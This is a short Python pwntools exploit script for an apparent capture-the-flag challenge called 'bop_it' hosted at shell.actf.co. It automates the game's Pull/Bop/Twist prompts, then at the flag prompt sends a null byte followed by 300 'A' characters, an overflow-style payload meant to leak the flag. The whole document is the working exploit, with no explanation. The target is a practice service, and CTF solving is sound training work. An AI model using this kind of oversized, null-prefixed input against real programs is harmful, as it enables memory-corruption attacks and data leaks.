from pwn import *

p = remote('shell.actf.co', 20702)
#p = process('./bop_it')

while True:
    a=p.recvline()
    print a
    if 'Pull' in a:
        p.sendline('P')
    elif 'Bop' in a:
        p.sendline('B')
    elif 'Twist' in a:
        p.sendline('T')
    elif 'Flag' in a:
        break;

p.sendline('\x00'+'A'*(300))
print p.recvall()
